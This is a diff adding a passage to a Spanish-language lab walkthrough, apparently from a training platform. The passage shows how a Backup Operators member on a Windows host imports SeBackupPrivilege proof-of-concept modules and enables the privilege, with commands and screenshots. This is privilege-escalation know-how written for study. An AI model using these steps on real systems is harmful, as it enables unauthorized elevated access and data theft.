@@ -382,3 +382,51 @@ xfreerdp /v:10.129.43.42 /u:svc_backup
 ```
 
 <img width="1547" height="919" alt="image" src="https://github.com/user-attachments/assets/710d0726-36a0-455c-8366-82cbfc7f2f74" />
+
+
+Abrimos una powershell como administrador y corroboramos nuestros grupos de pertenencia:
+```powershell
+whoami /groups
+```
+
+<img width="1031" height="769" alt="image" src="https://github.com/user-attachments/assets/64eb68d2-1e59-4260-b66d-39063c47e5d5" />
+
+
+Confirmamos que pertenecemos al grupo `Backup Operators` por lo que deberíamos tener asignado el privilegio `SeBackupPrivilege`:
+
+Utilizamos el comando `whoami /priv`:
+<img width="981" height="597" alt="image" src="https://github.com/user-attachments/assets/88e81b5b-52f6-455a-b341-7a8c18d7e0c9" />
+
+
+Vemos que tenemos deshabilitado el privilegio.
+
+
+
+Utilizamos el PoC `SeBackupPrivilege`, buscamos los módulos a importar:
+
+```powershell
+Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include SeBackupPrivilegeUtils.dll | Select-Object FullName
+```
+```powershell
+Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include SeBackupPrivilegeCmdLets.dll | Select-Object FullName
+```
+
+<img width="1125" height="408" alt="image" src="https://github.com/user-attachments/assets/9a433bcf-8ce9-4d15-bebf-343b68492818" />
+
+Ambos archivos están en la ruta `C:\Tools\
+
+Importamos los módulos:
+```powershell
+Import-Module C:\Tools\SeBackupPrivilegeUtils.dll
+```
+```powershell
+Import-Module C:\Tools\SeBackupPrivilegeCmdLets.dll
+```
+
+Habilitamos `SeBackupPrivilege` y confirmamos:
+```powershell
+Set-SeBackupPrivilege
+Get-SeBackupPrivilege
+```
+
+<img width="685" height="235" alt="image" src="https://github.com/user-attachments/assets/814d2407-1b91-4611-a4dd-9452562f45b8" />
